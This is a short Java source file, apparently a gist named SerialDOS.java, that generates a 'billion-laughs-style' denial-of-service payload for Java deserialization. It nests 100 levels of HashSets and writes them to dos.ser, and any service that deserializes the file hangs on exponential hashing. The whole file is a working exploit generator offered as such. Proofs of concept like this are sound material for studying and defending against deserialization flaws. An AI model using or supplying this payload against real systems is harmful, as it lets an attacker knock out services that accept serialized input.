//https://gist.github.com/coekie/a27cc406fc9f3dc7a70d
//SerialDOS.java
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.util.HashSet;
import java.util.Set;
import java.io.*;

// billion-laughs-style DoS for java serialization
public class SerialDOS {
  

  static void serialize(Object o) throws IOException {
    FileOutputStream fout = new FileOutputStream("dos.ser");
    ObjectOutputStream oos = new ObjectOutputStream(fout);
    oos.writeObject(o);
    oos.close();
  }

	public static void main(String[] args) throws Exception {
	    	Set root = new HashSet();
    Set s1 = root;
    Set s2 = new HashSet();
    for (int i = 0; i < 100; i++) {
      Set t1 = new HashSet();
      Set t2 = new HashSet();
      t1.add("foo"); // make it not equal to t2
      s1.add(t1);
      s1.add(t2);
      s2.add(t1);
      s2.add(t2);
      s1 = t1;
      s2 = t2;
      }
    serialize(root);
    }
  
}
